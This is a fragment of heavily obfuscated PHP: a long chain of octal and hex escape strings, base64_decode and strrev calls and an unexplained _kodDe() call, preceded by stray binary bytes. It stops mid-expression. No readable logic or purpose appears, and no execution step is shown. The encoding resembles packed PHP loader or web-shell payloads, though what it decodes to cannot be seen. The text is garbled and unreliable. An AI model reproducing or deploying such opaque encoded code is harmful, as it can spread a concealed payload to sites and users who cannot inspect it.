¯(T0Rå0ö&$HˆMÏS"«')."\174\200\134\50\200\15\206\341\246\21\213\6\52\67\311\120\110\175\206\350\352\201\10\233\373\270\72\122\244\33\104\0\234\2\275\341\256\136\40\356\305\273\3\100\26\366\257\42\42\325\362\220\57\36\11\15"."\206\351\351\4\214\43\303\205\260\277\153\65\73\55\140\320\156\357\112\47\4\26\27\365\366\124\4\63\141\17\302\21\137\215\207\103\120\62\366\7\273\35\31\42\275\314\163\206\35\26\17\6\372\227\127\114".base64_decode('iIbifUIWDAT74z4nzF5CxA+7gsc7g6EuITkQKu8JwMwdQCw60wW3JrYBnTW0dtTEUjNw+XXFweo=')."\335\21\333\130\133\23\363\164\270\353\230\314\210\207\106\120\323\257\14\326\314\250\215\311\171\334\156\122\0\13\0\211\225\131\374\122\32\44\176\167\42\330\116\322\366\5\262\342\157\24\174\136\100\113\20\267"."\xd3\x47\x46\x0\x9f\xfb\xc5\x23\xab\x23\xac\x27\xb1\xba\x7e\xa5\x74\x1b\xed\x60\x34\xf1\xe0\xd9\x81\xc\xfe\x6\x44\xd4\xa8\x9a\x2f\x56\x44\xb4\x11\x9f\xcd\x90\x41\x4\xb9\x35\x9d\xf7\x50\x4\x81\x44\xcb\x29\x8c\xc4\x31\x36"."\150\172\53\235\211\311\22\64\326\344\375\315\147\61\0\21\135\373\106\172\335\265\332\225\167\245\142\321\36\350\342\41\266\206\145\320\14\301\307\102\122\57\244\220\133\11\62\125\25\172\327\232\50\201\255\32".base64_decode('PcSFC4jpmtBolY5mtpnkHiauIMviuHhLNuYytUzBpeQyOuCJ2TyFKqO2dO6fo6iDjSh1GecCnxA=')."\xd2\x30\x32\x28\x9c\xae\xd\xf0\x88\x98\xb9\x35\x81\x11\x93\xc5\xc4\x91\x84\x94\xc5\xce\xfe\x23\xa8\x76\xad\x52\x33\xf1\xd5\xd3\xd\xd6\x24\x41\x63\x3a\x54\xb2\x2\xd0\x7d\xb\x37\x53\x82\x1c\xa\x39\xad\x21\xeb\xae\xc4\xbd".base64_decode('fFHhtDJThTtRQQWczs38KL8Eyo+yE226JNOVclztFu6K+BaVOOACaZ1T9PqFKGx3TkGV8rKVB1o=')."\x13\x89\x5e\xc9\xbc\x43\x91\x66\x57\x6f\x9f\xb7\xcb\x5\x38\x4c\x63\xb\xb9\xb4\x5e\x9d\x7\x64\xd2\xab\x31\x22\x51\x26\xcc\xe6\x38\xb4\xd2\x57\xe9\x12\x39\x7f\x81\x94\x5\xbd\x4a\x46\xbf\xdc\xc7\xc9\xd1\x76\x4f\x3a\x18\x88".base64_decode('XXAAoS8FT/7p8ouhDqrAQC5j4Dg27abXRVmFVRg2A4cqfXdVxe+uqvTdVY7vrir/LgY5qE8pFrs=')."\xb0\xff\x2d\x71\xce\xda\x40\x49\x31\x42\x99\x5f\x1a\xde\x6b\x88\xf7\x23\x44\x98\xc5\xf7\xd8\x6e\x90\xec\xd3\x4c\x28\x1e\xa7\x18\xbe\xc9\x43\x8c\xc2\xd3\x2\xed\xdb\x8a\xfb\x97\xde\x70\x24\xca\x8d\x59\x41\x50\x46\x42\x1c\x15"."\103\346\225\360\57\20\221\54\50\21\360\163\0\150\276\330\307\244\20\203\122\266\107\67\315\12\27\247\0\52\141\247\225\45\314\157\44\44\56\252\320\341\240\146\112\112\242\240\33\171\72\66\304\271\20\363"."\x13\xc3\xbc\xc8\x70\x57\x33\x78\x9b\x85\xc3\x7e\x66\x91\xd8\xa7\x4c\x7a\x33\x6a\x44\x85\x6c\x8c\x74\x94\x7f\xb2\xa8\x9b\xaa\xe8\xa0\x28\xa5\x22\xc7\x17\xcc\x6e\x45\x99\x84\xcc\x85\xde\x16\x2a\xc6\x28\x4d\x99\x74\x81\x5a\x3b".strrev('Ğ:/‚fİ‚\\*¹Ğ	îñÎP‹6h]ç:ŒæŞWAì¬ã€ó'."\0".'óÂfA6J:ª˜å<').base64_decode('kAwbDReZ0FnUM1TxAv+sqVQ9l8G9GoUiEeyhbbk6Rf0DOaaEw6VQrCfWF4uK/WoZSjoNqi14IbE=').base64_decode('1QV8Q6JNn939EdlpHlPR4RFJRE64PAYS2uWJOKNU5CayAq0i+L9PrSLJQDmVzlC+RyiWBE+nWCY=')."\36\100\76\254\50\123\21\166\4\310\167\24\361\317\306\234\71\201\156\55\164\352\51\262\30\156\250\2\364\132\325\132\165\164\15\370\255\255\222\253\240\360\203\342\160\204\41\0\175\273\252\365\350\32\24\250"."\x25\x66\x93\xd3\x54\x67\x8f\x3b\x63\xe1\x27\xa1\x44\xd6\xef\x50\x2c\x4b\xd8\xc1\x77\xa0\xbe\x83\x13\xbf\xd1\xd3\xe8\x99\x20\x3c\xa6\x63\xc\x7e\x91\x7b\x57\x74\x2e\x18\x93\x71\xc0\x23\xa9\x7e\x45\x5c\xe4\xd4\x64\xd\x20\x63".strrev('Áö¥QĞ»K¹öê¢×nÑƒÕmœ_Q-_]Áº­¨Îâ$çÌ˜í-#İÅÆ·Û×,¡kçŞPš²ô¦$')."\xb3\x38\xe8\x9a\xa\x3b\xa6\x6c\x27\xdb\xfa\xa5\x70\xae\xb2\x88\xc7\x1e\x9b\x2d\x2f\xe1\x7d\x79\x65\x5a\x2f\x80\x75\x11\xec\x86\xf3\xee\x24\xe9\xcc\xd2\x7f\xc2\xe3\xb8\xd3\xab\x82\x6a\x4d\xe8\x6\x39\xd1\x64\x42\x5b\xb3\x38"."\45\10\241\231\144\372\142\3\320\126\170\200\100\173\150\260\70\125\52\270\272\200\344\340\302\362\116\153\245\5\261\265\336\216\17\335\221\332\361\105\276\12\71\126\334\301\261\70\103\312\363\40\366\55\330\52"."\211\16\47\5\57\102\56\50\166\340\171\116\267\251\4\6\271\60\5\151\242\117\46\72\61\226\71\352\13\107\303\5\344\66\70\105\300\54\5\313\271\245\126\102\41\315\225\52\166\202\344\354\5\224\5\216"."\277\113\364\230\70\351\52\241\344\202\72\151\271\40\11\270\250\47\210\362\24\76\327\53\126\65\111\250\251\22\312\140\111\113\71\77\211\116\217\135\245\22\375\140\305\102\105\357\251\24\1\65\42\220\232\255"."\xe1\x18\x6a\x93\xe5\x15\x40\x1\x4c\x7c\x77\x6e\x7\x84\x53\x9e\x72\x7f\x6c\x60\xd6\x4b\x8d\x4d\xad\x2d\x8b\x5b\xa9\xc6\xe5\x31\xf4\x48\xbc\x54\xb4\xda\x58\x90\xfa\x6b\x3b\xd2\x93\xa6\xc\x84\xfb\x4f\xa4\x2d\x86\x63\x6e\x73"."\122\47\200\171\347\62\326\100\71\217\15\217\327\326\346\103\223\64\24\157\46\5\327\174\25\70\155\112\35\247\253\60\131\204\5\345\56\66\32\31\32\60\30\276\302\47\103\42\67\312\53\234\200\127\134\204".base64_decode('lkdBfXQus6HlWmD8Sej+tk1IlCxdl/JKYYrsJuaZrfNMrB40z92cNkGEyBy5EvPLWERh6gocacM=')."\x78\xa0\x23\x47\xf7\x7a\xea\xde\x37\x49\xc7\x6f\xa9\x96\xcf\x48\x49\x78\xf6\xd5\x56\x5\xa1\x55\x92\x69\x24\xa9\xf3\x9c\x2a\xf\x61\x75\x8\x81\x6f\x81\x96\x6a\x24\x4b\x35\xcc\x22\xa5\xc1\x80\xb8\x50\x8\x27\x57\xb7\x2f\xf5"."\x68\xed\x94\x1d\x82\x1d\x7\xa4\x9b\xb0\x4e\xc5\x4d\xb6\x11\x19\x67\x87\x4b\x15\x4f\xcd\xbc\x49\x87\x6b\xc3\x2e\xa5\xb0\xb2\x3c\xb\x2c\xdc\x9d\xac\x94\xe4\x41\xa7\x46\x1e\xc1\x25\x26\xd9\x45\x8b\xaa\x3c\x36\xcf\x16\xf6\x3"."\107\166\144\125\241\127\213\112\162\24\112\347\234\303\341\144\67\111\30\200\202\76\116\260\271\334\263\204\63\153\120\161\360\51\270\321\63\264\114\226\36\161\154\300\5\301\245\160\343\306\162\30\271\346\166\46".base64_decode('eYuaEwTHywmDe1UOA6za/hlMKyISh1CcYH/PMFUSQbHYcLW7buNGj0Zvd2JVFBcvhG6GjeMxtx0=')."\37\124\216\364\46\103\44\0\47\46\26\233\216\45\124\74\327\123\307\225\22\331\55\216\4\257\166\332\332\332\207\331\121\342\10\115\243\2\217\326\260\210\216\343\164\326\25\35\142\301\256\176\56\0\62\312"."\xc5\x33\xcb\x8d\xb4\x3e\xbd\x76\xd7\x43\x1d\xe3\xcc\xc9\xa5\xa8\x74\x86\xc3\xde\x62\x51\x8c\xb2\xe9\x38\x95\x53\x3d\x39\x2d\xe1\x61\xd3\xc6\x83\x60\xee\x24\x57\x82\xa4\x28\x68\xd2\x3a\xe0\xf0\xa\xc6\x91\x0\xd5\x54\x11\x78"."\34\154\101\200\370\260\336\11\7\145\61\40\13\54\65\223\206\126\264\154\23\36\373\172\257\102\156\111\327\53\343\12\106\251\222\250\143\351\52\344\144\255\12\114\160\234\102\146\71\257\312\122\310\52\45\103"."\xcd\xb5\x55\xa1\xea\x9a\x59\x55\x5\xf9\xb3\x40\xd2\xad\xf8\x11\x90\xb1\x4a\xa2\x6c\x26\xaf\xb0\x1e\x33\x2c\x1d\xf0\x6a\xa6\x7b\x48\xdc\xef\xe\x86\x89\x7a\x97\xb7\x7f\xb5\x4d\x36\x38\x6a\x2d\xfe\x3d\xfa\x28\x4a\x28\xc8\x6b"."\x73\xe\x8\x5d\x48\x87\x5\xb1\x12\x74\xb8\x9c\xe6\xe7\x3b\xc4\xd5\xf1\x40\x38\x14\xd\x75\x51\x17\xaf\x95\xe\x82\x9a\xa9\x20\x66\x62\xf5\x52\x2e\xc7\x53\xf5\xc2\xe5\xfe\xd5\x76\xc\xb6\x88\x79\x8\x84\xc\xbf\x51\x2a\x14".base64_decode('2EUZlK3CJeYAD3oaiGRLFvd3BP2xRaGquEnAgosL6GBDTbnpmsVcrRB4hRz4WBGWR6eD4H6Sfik=')."\xa7\x53\x1f\x1f\x8d\xf5\xf5\xf5\xae\xfa\x6\xf0\x3f\xbb\x56\x20\x9f\x68\xa5\xb6\x2e\x2\x4a\x7d\x7d\x2b\xfa\x9f\x88\x5\xf0\x98\x91\x74\xa8\x3d\x5\xcc\x5f\xca\x4b\x8\xc2\x4\xd8\x4d\x93\x10\x41\xd1\xa\x25\xba\x88\x83\xfe"."\102\356\65\132\351\104\137\42\154\114\226\110\52\154\35\211\251\316\226\6\365\214\155\120\50\227\207\63\233\206\301\112\12\206\3\265\234\366\44\275\41\4\150\174\240\101\75\374\205\24\221\217\227\140\35\346".base64_decode('NvFjbtqDIlA8wrVYmu37AAqWvCSrOgQI23W40gv+RWBUvHdDyUybFsVyzBoDRvtZSZVIKKtPxPk=').base64_decode('Cgajx7IY6hMoXlNiYa0nHUMZHyUOeudE7nuQicOolrNpsceFskUnhIC/QDmMDis+MiYfgP483Lw=')."\xf7\x90\xdb\x2a\xe4\x8c\x1e\x5f\x23\xb7\xce\x15\x7a\xd2\xd0\xb9\x2e\x79\xd9\x6b\xb\x34\x16\xa9\x7c\xf7\x29\x9c\xe4\x50\xd8\x2c\x98\xec\xa0\x87\x42\xfc\x14\x80\x6f\x27\xbb\x98\x13\xe\xa1\x0\x67\x92\x23\x8f\x37\x25\xbc\x21"."\x60\x72\xef\x1b\x5d\xcc\x9b\x8f\xe8\x92\x3\xfb\x1b\x11\x6e\xf5\x4c\xe2\x2b\x8e\xfb\xf9\xa1\x65\xb0\xd6\x97\x8c\x9c\xbb\x68\xe8\x19\x30\x12\xa6\x50\x2f\x8\x1f\xa8\xc\x66\xe8\xe5\x98\x15\x90\x58\x83\x44\x3c\x11\x8\xef\xec".base64_decode('qft6QlTsTBpsYhhbFFC5+rcAtN+/CwldzN2rCIQi9aCwTWIftVMHlNcdJZN0fisM96viwZ6mdxE=')."\12\200\155\342\127\100\166\170\31\255\20\72\157\43\4\376\306\251\347\322\300\171\204\103\240\352\262\303\23\361\150\260\302\10\332\107\251\154\70\20\135\367\302\253\21\66\223\205\30\272\36\166\43\47\165\134".base64_decode('ZHVEnVfIiEdZlM1Q/1oF5sgWNhVzbRyv8AWSiWVx0xtldzKdcYAYYZQBVC6dI/1KIDJS3tanTwM=').strrev('DøĞK(/´oyf©ÓwBÓKO,×,MHu9hH	Zæ‚ĞĞ¡¤KÜJêS	¢äÍRõÜZx£Ş').base64_decode('6gESn14rdWUNPa96GhdCpf7mlib34mYpoqQVQyO5CIcjCokT5Be+jRQXqhwX9nl4kcZhdO8NqU8=')."\x12\x10\xf0\x15\xf\xb9\x48\x1a\x86\x45\x11\xfd\x3a\x40\xe2\xe8\xd5\x25\xb1\x34\x54\x2\x51\xa4\x11\x37\x93\x10\xd7\x4e\x1c\xf6\x62\x21\xc2\x8\xc7\x95\xe0\x2b\x2a\xb6\xbb\xab\x23\x36\x51\xf6\x6c\x7b\x95\x5\xf2\x7a\x81\xfe"."\140\224\121\33\324\74\316\211\157\325\14\151\51\166\363\73\34\63\107\352\142\236\76\65\245\51\235\372\44\216\16\243\37\244\234\10\65\275\152\141\164\376\177\22\255\213\215\120\315\40\370\301\136\225\357\246".strrev('èb¦\\6H4æÃ'."\0".'Ú[|Ö'."\0".'£‚îz›±‡'."\r".'æçQéiòĞ/ñó\\†*LÇ÷-“ÈovÎ.İ|ó<')."\xa9\x52\x92\x16\x39\x60\x8b\x15\x53\xe9\x95\xe2\x26\xd2\x47\xe6\x15\x92\xb2\xc4\x47\x65\x26\xd\x6a\xba\xc\x5a\x64\xc4\xa\x23\x68\xee\x43\x28\x6a\x7\x86\xd5\xd9\xda\x86\x61\xf3\xe7\xcd\xf3\x87\xba\x99\x46\x20\xc7\x98\x6c".base64_decode('rB+xxzpqhgvpkY7aGphxhsBwKbR76atDtqqIX7V173w9sd6jDRJkQj+obkuX1rjratvb+QbQA4k=')."\320\126\2\253\63\164\110\130\136\266\55\22\246\310\6\163\136\350\1\222\204\61\125\374\267\163\252\30\235\144\206\167\144\377\156\116\117\300\107\72\174\170\4\7\226\202\76\131\333\76\122\127\73\334\136\1"."\302\362\15\30\352\170\305\46\203\176\143\343\35\43\317\41\305\210\254\36\243\257\44\21\75\267\30\121\164\243\72\151\114\107\215\66\245\46\26\213\245\220\363\150\246\117\114\40\314\337\170\315\121\40\336\50"."\142\140\0\105\70\212\342\55\35\126\134\151\124\327\166\200\314\324\114\227\272\353\332\217\246\231\321\371\75\45\220\175\347\122\223\240\336\72\366\365\311\156\77\370\143\104\171\14\51\36\35\355\23\144\300\252"."\x5d\xfe\xfe\x68\x20\x1a\xf0\x13\x3d\xea\x5d\xe6\xcc\xdd\x67\x5f\xd2\x7\xf3\xf0\xcf\xbe\x73\x69\x91\xa0\x73\x63\x93\xf5\xf5\xe0\x6f\x31\xf8\x53\xc0\x5f\x12\xfc\xa5\x20\x9\xc7\x4c\xf0\xef\x22\xf0\x7\x52\x9a\x0\xb4\x49\x8d"."\115\266\44\300\37\110\135\10\176\27\102\254\64\370\153\341\134\244\275\235\27\14\132\353\165\165\203\146\127\52\34\144\151\147\24\56\124\20\356\326\23\353\51\337\244\207\12\320\67\277\252\320\71\244\344\350".strrev('Bû3R-ÍM'."\r".'õÜ»æ³Y8–5ÿ†˜m0ËP­làğ‡hO³ƒ¼à3?Û¾)’')."\x29\xaf\x1a\xf4\xa8\xc4\x83\x3c\xf7\x35\xc1\x1f\x2d\x45\x7f\xf8\x21\x8c\xfd\xb8\xb4\x68\x52\x33\xf4\x3c\xb3\xf0\x6\xbc\x91\xca\x2\x82\xe\x8c\x29\x6a\xd\x8d\xaa\x53\x7d\xf4\x64\x1\x2e\x95\x69\x78\x3\x43\xd2\x16\x75\xe".base64_decode('EMrxxIYht4lRSoTOSwU9FBKLZKkn+Xn1jalW9o8DRuWkjOkW6oof6lFKoE1UA2p9McMrFhXe9AE=')."\104\140\166\341\133\102\341\144\27\226\50\224\55\234\46\242\70\174\344\210\12\104\30\220\113\120\117\354\142\232\0\136\346\6\102\124\332\355\137\25\350\166\167\301\67\212\42\105\146\3\154\206\173\210\246\46".base64_decode('C6DKu+F2raDm6CUnvN8KszUONEleX1QzcrGQkTNaWk7ki7KlpdPwHxmMoVxMpmRzPCOraWVSnlA=')."\23\105\352\222\331\150\224\125\43\55\217\246\222\162\52\151\310\51\120\100\301\230\220\13\152\132\326\1\334\230\150\224\213\40\154\2\230\2\376\114\203\370\176\30\327\122\252\16\66\105\246\236\53\41\235\243".strrev('Mÿ&æúJK³ñÆ„‡†^Òú¢b1gjÌVÊf-¯êÌYÁ%Ru,Â«İêût^¶U¢TSàYÉ').strrev('¸¥„TÔ"’¨‰/i‚e%èDÎBEr¥eÄ†èŒ.)»¢"›€Ò‚¿A—ÌhÊ"Ä‡øn‹æ').base64_decode('WY5pa4VuRNnDJAnNGgAbaIWr8+HRBHAzXoR2jEISBALsAW2S2hIvc+NbU45fhIkygxvKhCONEKE=').strrev('R’ø2ã‹’„ôäÌC6eÇU4C@«Ãoñ¼™*7a}zs-–…43Dğah;8  Tc').base64_decode('AFyFOR9Y5sZxUJrbnpKhmkI5vZDRrFLK3qaegQiqSglkcDtQcqC8f5HBhqHk/hW+HSOljmtJtU8=')."\31\255\100\120\20\112\111\46\317\60\160\16\316\343\155\71\340\251\10\313\302\337\317\101\314\327\307\216\364\304\54\1\232\4\317\261\101\327\321\334\50\113\212\303\205\202\274\2\13\25\213\302\254\225\26\40"."\62\332\44\340\214\324\166\320\13\10\15\252\306\164\213\73\17\122\114\127\250\157\140\60\352\367\271\53\42\121\240\160\363\40\122\145\205\144\170\214\14\266\353\350\40\161\226\134\263\240\40\125\51\120\30\77"."\372\24\63\225\247\166\103\45\172\121\323\116\104\57\113\24\0\201\102\123\113\76\337\255\345\52\54\104\137\203\6\222\112\246\17\164\260\122\160\314\120\326\207\25\120\2\221\20\152\50\130\245\370\43\247\342".base64_decode('FysiDGU1S+1UcmWfQlnKU2nvcI24Sn3HUymkU1PMWUapDMW/UliISVBJykrKMmWlJCt5Q1bGDTk=').base64_decode('oRdG5ZSZBn+mDJZemJzOAcScIucAA5PzWkqT8yCgWfJkXjab8mQRzhdBYrFJ1tOGbIyCIs0snBs=')."\243\362\204\62\56\117\344\25\71\337\254\310\172\46\43\217\217\245\345\211\161\171\134\117\312\26\75\373\245\142\122\334\24\325\357\306\112\132\162\24\202\335\360\37\60\56\371\242\31\57\25\264\111\352\271\72"."\257\353\343\122\176\234\272\121\232\35\37\373\227\166\342\143\241\4\360\75\103\67\107\25\67\122\3\122\15\347\162\304\322\207\11\302\14\324\223\3\243\255\24\213\62\20\150\122\140\333\211\154\77\107\234\71"."\x79\x7d\x86\xd9\x2a\x48\x75\x8d\xe2\x50\x52\x13\x73\xe0\xca\xd0\x4f\x60\x39\x41\xd0\xa0\x80\x89\x78\xe5\x8a\x1b\xb6\xe3\x6f\xe6\x5\x3\x1e\xa7\x88\x22\x2a\x11\xb9\x40\x71\xd4\x7f\xb\x5e\x19\x5\x45\x77\x8c\x32\xdb\xca\xe8"."\xfc\xbc\xd\x34\xc\xe4\xed\xf1\x86\x19\xf8\x6f\xe3\x8c\x2\x78\xeb\xb8\x6e\x24\x34\x93\x3e\x32\xc4\x9a\x3e\x22\xa\x9b\xff\x7e\x26\x91\x19\xfe\x7\xb9\xb8\x7c\x9a\x51\xb\xc6\x7f\xfc\x55\x21\xd3\x94\x4a\xd\x4d\xfe\xfd\xec"."\74\17\350\50\152\257\374\37\164\24\314\24\27\337\373\42\110\246\273\250\45\41\247\166\327\273\371\175\11\22\153\350\334\153\6\263\164\134\116\67\303\251\66\16\246\331\270\234\327\307\301\214\326\144\43\77".base64_decode('npDzo+MgAGXmPJiHIKwCkdCcSJO525RplJsyRVkBEz+hAQ6gjaflgjkug9kP/p+wQHHgNw9kkTw=')."\224\320\363\100\124\37\327\23\224\355\100\55\127\267\136\200\36\370\241\177\172\367\4\74\272\223\147\23\256\313\361\263\350\344\255\74\303\324\177\312\6\144\373\204\115\222\103\265\270\240\373\377\157\263\10\107".strrev('ÄÂ¿÷§ÍÄa¦a¾¸{¦ÙwŠœ°(©húéÏ%ªğÌ‘£“ù3 ˜D¥ZMÌ¹„aí×	(Y8Y')."\305\376\53\54\304\30\4\44\336\63\30\35\245\307\277\276\212\344\113\102\6\141\17\311\371\46\347\227\63\42\277\234\41\314\156\304\46\374\72\211\203\161\135\230\0\73\201\236\205\222\337\62\256\73\154\200"."\x3d\xa3\x38\xaf\x2a\xec\x1e\x88\xc8\x45\x99\x31\x7d\xc4\xdc\x56\x11\x36\xf9\xbe\x6\xcb\xc1\xe6\x6d\xcc\xdd\xc6\xa2\xf3\x6c\xf1\xb6\xed\x84\xcb\xc0\x68\x50\x70\xb8\x8c\x9f\x1b\xc9\xac\x46\x6f\x9d\xd0\xad\x9\x17\xfc\x4b\x5"._kodDe('LSarREGtc1BACGR/jx7yLPPZJXUiMXL7GDcgy/krREGEVcGyslGPxJl9fNTtEq7p60xiLEwjK+BX')."\x36\x3\x7a\x71\x81\xf\x65\xd8\x43\x84\x43\x8a\x1\x15\x18\xe4\x28\xd1\x4b\x93\x48\xaa\xa4\x17\xd8\xb5\x16\x39\x17\x9b\xc0\xa8\x38\x32\xd0\x3b\x10\xf7\xe\x46\x7b\x5\x47\x9\xc\x34\x40\x34\x70\xd0\x2b\xcf\x10\x12\xa\x7".base64_decode('1ni5W6SEYtLzoqGhIRc8b4dWHEn0QHQnTJQgI8y3VY3qqWROL6WqeIGeBne91FzfIA0WqP4i3R4=')."\xd1\x57\xbf\xb\xba\x4b\x78\xae\xcf\xf1\xee\xb7\x3d\xd1\xf6\x24\x2d\xfd\x38\x4e\x2\x7b\x9\x40\x56\xc2\x8e\x39\x34\xae\x1a\x82\x2a\x3e\x7d\x65\x99\xfc\xf6\x85\x56\xfa\xc9\x7\x43\x3\xe4\xfc\xa0\x6f\x39\xd3\x43\xf1\xa9\x45"."\52\64\167\225\75\337\213\124\147\46\363\271\45\114\61\107\70\25\135\352\153\55\32\172\61\255\25\122\22\300\51\230\255\276\266\52\237\167\145\153\125\73\110\122\162\71\230\52\171\332\227\172\70\42\31\261".strrev('–İ¡Iïh YÄ'."\r".'ƒ‚Öd5¨’ªuB®ÂWtô'."\n".'»	M”ù<'."\n".'úpéäcÇ !À$\\À; hp').base64_decode('0A8wykw/EIH4/NASXiCPLDsFd9gbYCAxeesVTd5AR8D1Cd6Qw16FHZOE6kJo0uCusaWzXBnVIrc=')."\xb2\x8\xe\x6b\x97\xf2\xc0\x75\xc7\x85\x9f\x43\xd7\x8d\x29\x98\xd9\x81\x56\xf1\xa3\x54\xeb\x9\x59\xd1\xf3\x3b\x66\x72\x75\x4d\x66\xb9\x60\x31\xcb\xad\x7d\x13\xcc\xa\x0\x14\x89\xee\xeb\x1c\x3\x4d\xa2\x91\xb6\x2a\x62\x12"."\x47\xe7\x5\x64\x86\x55\xed\x98\xef\x2d\x8d\xb4\xaa\x93\x70\x50\x41\x93\xdb\x43\xe8\xa9\xe4\x7e\xdd\x42\x6a\x4f\x4b\x3d\x62\x1a\x40\x4\x5c\xc3\x4\x1b\xe0\x76\x36\x5c\x10\x83\x2\x51\x71\xb0\xd5\xa8\x2a\xed\x76\xa2\x85\xfb"."\365\126\211\275\163\315\51\266\144\245\11\301\256\124\214\251\126\251\302\173\331\271\212\12\334\26\52\221\60\261\276\150\305\111\13\355\171\100\325\332\26\55\150\256\257\227\363\45\323\162\31\252\375\335\122\330"."\121\22\71\77\354\213\270\360\304\166\255\324\0\77\360\121\313\140\364\154\171\253\104\46\202\54\321\371\201\103\3\336\150\127\257\54\41\142\225\245\36\177\24\200\7\301\77\130\175\136\226\340\274\6\311\140"."\236\313\22\264\313\225\245\301\176\374\313\125\237\101\337\141\262\100\206\53\250\53\101\34\122\64\45\32\17\211\222\44\70\143\241\172\14\351\165\14\240\43\232\157\35\322\12\115\215\120\363\31\233\346\300\175"."\x3a\x21\x6\xc0\x1d\x4b\x46\xa1\x15\xfb\xf9\x31\x5d\x79\x2d\x9\x56\x75\xb0\xa2\xba\x0\x49\xb4\x42\x1d\x3c\x7b\x19\xf4\x22\xf3\xff\x5f\x2\xac\x5\x55\xbf\xfe\xff\x97\x2\x55\x26\xbc\x16\x58\x64\x12\x25\x4b\x35\xff\xa3\x32".base64_decode('KINjXYXVitrJqtAgNdbXS6HlEI2kzBVy0U4mvACPD1mlsXpGShmnL6Nm4STTCuwpe8SowMCHhRc=')."\343\165\373\162\20\265\161\153\322\260\24\345\324\144\264\241\346\170\12\156\62\100\336\51\326\16\270\266\217\253\60\215\166\26\306\304\254\54\325\212\276\202\271\30\3\333\20\101\201\30\23\114\362\134\311\4"."\205\161\154\234\306\320\123\160\35\152\327\12\360\41\125\13\361\66\14\141\10\372\104\101\245\223\36\346\207\266\153\36\4\364\160\306\14\363\141\104\226\217\70\210\154\17\340\242\125\210\102\141\366\126\101\113"."\245\166\72\53\364\242\62\126\122\31\274\325\61\113\130\233\121\46\106\6\216\36\243\130\266\256\145\344\202\213\204\157\231\271\242\350\33\234\1\25\360\12\321\52\101\217\302\56\300\117\306\313\130\162\31\55"."\300\1\235\225\47\316\272\210\177\355\312\212\265\160\351\302\212\210\15\7\127\271\374\223\105\120\107\65\5\126\152\260\141\237\262\31\301\172\326\142\73\7\174\155\127\127\353\242\1\346\340\207\334\362\20\133"."\371\161\264\114\21\46\15\245\121\22\36\7\363\1\172\6\115\65\70\1\215\24\133\117\247\341\161\4\211\21\54\264\237\244\131\360\146\221\306\212\71\245\240\322\267\353\307\101\126\121\260\135\51\146\134\151"."\xcf\xc8\x50\x69\xb2\x70\xb6\x2e\x56\x3d\x8e\xd\x0\x9\x64\x32\x5e\x54\x73\xf8\xb0\x4\x99\x66\x51\xf8\xd4\x2c\xf0\x64\xce\x80\x9e\xc4\x52\x62\x5c\xcb\xc3\x2b\x46\x85\x55\xd2\x0\x22\x3b\xe0\x46\xa3\x14\x27\x63\xa8\x6a\xc1"."\x6\x49\xe4\x4a\xaa\xd\xa0\xe4\x8a\x59\x5\x41\x30\x80\x3c\x94\xd0\x95\xf0\x74\x65\x3c\x5d\x86\xa7\x8b\x6c\xb5\x77\xc5\x3f\xbb\x91\x64\xb2\x6a\x11\x1f\x49\xf4\x79\x5\xd4\x40\xbc\x93\x86\xde\x5b\x32\x5a\xba\x22\x1c\x5e\xcd".base64_decode('VUwoUqlugmvsZAVdGgEdXlajOwkhJaxbbG3l9jIoKZ2jal6Bvp54dzAwEEcifqg/6g06EgDPjAY=')."\xba\xca\xc0\x9d\x21\xea\xbf\xd5\x51\xeb\x44\xde\xae\x86\xa6\x15\xd0\x32\x3f\xc0\xfd\xd0\x80\xa8\x62\x32\xff\xa5\xc4\x2d\x20\xc9\x3\x75\xfa\x71\x70\xc9\xd2\x84\xe1\xa1\xa6\x7f\x9\x61\xc3\x63\xe6\x95\x1c\x53\x68\xf2\x50\x3d".strrev('ú2Ùl²[(úâ`RYá½D¤©îjğŞÂ„F='."\0".'š\\Ğ<Ã – »û!ã¹Eq""Ys')."\102\146\62\207\155\5\241\156\77\273\57\7\120\170\372\244\226\103\225\162\114\250\226\207\354\170\154\367\355\141\305\360\342\26\124\110\134\243\25\147\111\324\212\364\175\303\42\125\57\57\226\350\145\66\73\116"."\x13\xfc\xc3\x2c\x24\xbf\x93\xe4\x37\x31\x4d\xc8\x5a\x31\x88\xee\x40\x52\xa1\x2f\x54\x98\xe4\x7c\x2c\x33\xd\x55\xdf\x68\x18\xac\x34\x39\x7e\x8e\x89\x94\x81\x47\xa4\x2e\xa5\x50\x6d\x49\x21\x80\xb6\x44\xea\x83\x86\x44\x85\x8c".strrev('Dİ¸ÿ¡Ãî~Û…“2*LTÌ€×Õà!‹Á¿ÙÑ¤¹ÉufMÕ#yT8¹sU™…«Ü›]Z'."\r".'4')."\x89\x7\x9a\xfe\x3\x66\x62\x47\x42\x5e\x28\xa9\x4d\x3f\x3a\x36\x88\x3\x3e\x27\x38\x2b\x84\x92\x92\x4\x97\x16\x64\xbe\x60\xf3\x9b\xb2\x5c\x4f\x91\x61\x6b\xc5\xce\x52\x52\xea\xe4\x12\x9\x79\x2\x22\xe\xa7\x2b\x3b\xdf\x41"."\237\221\300\147\240\251\226\204\55\116\155\12\202\30\241\14\322\152\323\63\304\11\345\25\236\127\337\120\57\230\142\4\272\374\221\370\261\21\350\367\62\30\240\176\130\354\11\1\220\26\15\317\222\342\15\317".strrev('+S7Õæ•ŠoQqxF8(F+ü$?ÒW>›µÃÙÙÁÁ½QÇòèˆ¡C§°º.”–v<ê–')."\xfe\xe2\x23\xec\x9b\xb8\xf0\x2e\x33\x3e\x32\xc3\x61\x1d\xed\xd0\x70\x58\x4a\x2a\xd8\x9a\x25\xa1\x62\xa9\x40\x4d\x41\x47\x9f\xb0\x76\x92\x9\x64\x65\xca\xc9\x8f\x82\x5e\x7c\x3d\x9e\x1a\xf7\xfc\xda\xa3\x8f\xca\x8b\xb0\x58\x1d".base64_decode('BMbqPEcNkmocxWEA4WgG96ytqZqprnXX1cQaapn6VoyagMViJaL8NLKheSP3KRgbdtfFRo4WtMk=')."\66\0\300\106\6\230\310\322\363\60\344\212\201\141\231\165\65\303\125\325\43\356\272\341\265\261\330\10\14\326\2\130\53\204\307\42\356\272\132\271\343\150\317\240\146\212\370\330\63\362\254\70\244\313\251\21".strrev('¶m¨²Ó+·¬×"««R'."\n".'k¢R’èC£Qf‚Ø5Ğ¶@¢ùY®üSøÓê!d$»E‘Cî